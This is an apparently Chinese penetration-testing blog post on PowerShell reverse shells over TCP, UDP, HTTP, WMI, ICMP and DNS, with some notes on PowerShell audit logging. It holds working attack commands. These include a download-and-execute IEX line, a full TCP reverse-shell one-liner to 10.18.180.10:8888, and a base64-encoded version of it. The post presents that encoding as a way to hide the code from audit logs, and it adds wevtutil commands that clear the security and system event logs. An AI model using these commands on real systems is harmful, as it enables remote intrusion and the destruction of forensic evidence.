# powershell各种反弹姿势以及取证（一）

0x00 前言
=======

* * *

当我看了DM_牛发的http://zone.wooyun.org/content/20429，我的心情久久不能平静，这本应属于我的精华+WB，被他先发了，这娃真是可恶，可恨 ：-)，后来DM_牛又发了我一些资料让我学习，我就写了此文，刚入门，肯定有错误的地方，希望小伙伴们讨论，指出。

这次Labofapenetrationtester是以"week of powershell shell"的形式放出来的，就是每天一篇，一共五篇，分别是

```
Day 1 - Interactive PowerShell shells over TCP
Day 2 - Interactive PowerShell shells over UDP
Day 3 - Interactive PowerShell shells over HTTP/HTTPS
Day 4 - Interactive PowerShell shells with WMI
Day 5 - Interactive PowerShell shells over ICMP and DNS

```

0x01 前三天
========

* * *

第一到三天的TCP,UDP,HTTP,HTTPS的反弹方法为： 把相应的PS1脚本传到目标机上，然后执行

```
D:\>PowerShell.exe -ep Bypass -File d:\Invoke-PowerShellUdp.ps1

```

就会走不同的协议出来，我这里演示的是UDP协议的，如图

![enter image description here](http://drops.javaweb.org/uploads/images/07caab53b473c0d2d0b826c19446b5e83f6c94cd.jpg)

要先监听端口，再反弹，否则会报错。

实际环境攻击的话，我常常还加`-NoLogo -NonInteractive -NoProfile -WindowStyle Hidden`参数，如下

```
PowerShell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File d:\Invoke-PowerShellUdp.ps1

```

另一种玩法是如果对方通外网，可以直接用IEX下载远程的PS1脚本回来执行，

```
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')

```

0x02 Day 4 - Interactive PowerShell shells with WMI
===================================================

* * *

这个通常只能用在内网，可以完全替代psexec了，作者这里利用命名空间来保存WMI执行结果，最后再取回来回显结果的思路非常赞，解决了WMI远程直接命令没有回显的问题。当然运行这个脚本需要管理员权限，并且要输入对方的账号。

0x03 Day 5 - Interactive PowerShell shells over ICMP and DNS
============================================================

这个脚本运行，走ICMP协议的话，只需要注意一点，本地要先执行

```
root@Kali:~/Desktop# sysctl -w net.ipv4.icmp_echo_ignore_all=1

```

否则反弹是无法用的，相信用过icmpsh的同学都知道。

后来有个老外BLOG说做如下配置，可以发现powershell攻击行为以及看到攻击代码

配置需求如下：

1.  在C:\Windows\System32\WindowsPowerShell\v1.0目录下建立一个profiles.ps1

填写如下内容

```
# !bash    
CD D:\ $LogCommandHealthEvent = $true $LogCommandLifecycleEvent = $true

```

1.  右键点击profile.ps1，一次点击“安全”->“高级”->“审核”，点“编译”按钮，添加用户“everyone”，开启如图所示的审核项

![enter image description here](http://drops.javaweb.org/uploads/images/edd7e13d6bb261c0d2b5d36ff1084ee1a15f5c1d.jpg)

1.  因为这样做以后，日志会变的很大，为了编码回滚覆盖，相应的增加下日志的容量，如图

![enter image description here](http://drops.javaweb.org/uploads/images/a144f163c09bcb2a233a13cac2c0193374d169ae.jpg)

怎么能绕过这种防护呢？因为他加了对profile.ps1的文件审核，所以通过修改或者移动/删除这个文件的策略是走不通的。

当我们执行了反弹脚本后，可以在“事件查看器”里的“windows powershell"的事件类里，通过过滤eventID为500的事件看到细节

```
CommandLine=$client = New-Object System.Net.Sockets.TCPClient("10.18.180.10",8888);$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text language=".encoding"][/text]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

```

如图：

![enter image description here](http://drops.javaweb.org/uploads/images/1c36ee9e6da58c8ce6d8db302d7abf3157b578ab.jpg)

刚开始我想通过-noprofile选项因该可以绕过这个限制，实践后发现不行，还是会在日志里看到，然后我又配合用-enc选项进行base64编码，操作如下：

```
powershell -ep bypass -NoLogo -NonInteractive -NoProfile -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQA4AC4AMQA4ADAALgAxADgAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgAyADUANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA0ACgANAAoA

```

发现虽然日志还是会有记录，但是不会在CommandLine=里看到脚本代码的细节了,多多少少算一个进步(此刻感觉自己屌屌的)。

当然，最绝对的办法，还是在目标上用完powershell后，来一下

```
wevtutil cl "windows powershell"
wevtutil cl "security"
wevtutil cl "system"

```

当然如果权限低，就没办法了：（

用powershell做攻击的好处是显而易见的，省去了免杀（我测试的时候是这样的),方便传输（注入的时候），系统自带（win7以后就支持了）。但是即使管理员不像上面这样开启审核，默认还是有痕迹的，有机会下篇再细说。有喜欢渗透的小伙伴都加我讨论，自己搞太慢了。

**_参考文章：_**

http://x0day.me/

http://hackerhurricane.blogspot.com/2014/11/i-powershell-logging-what-everyone.html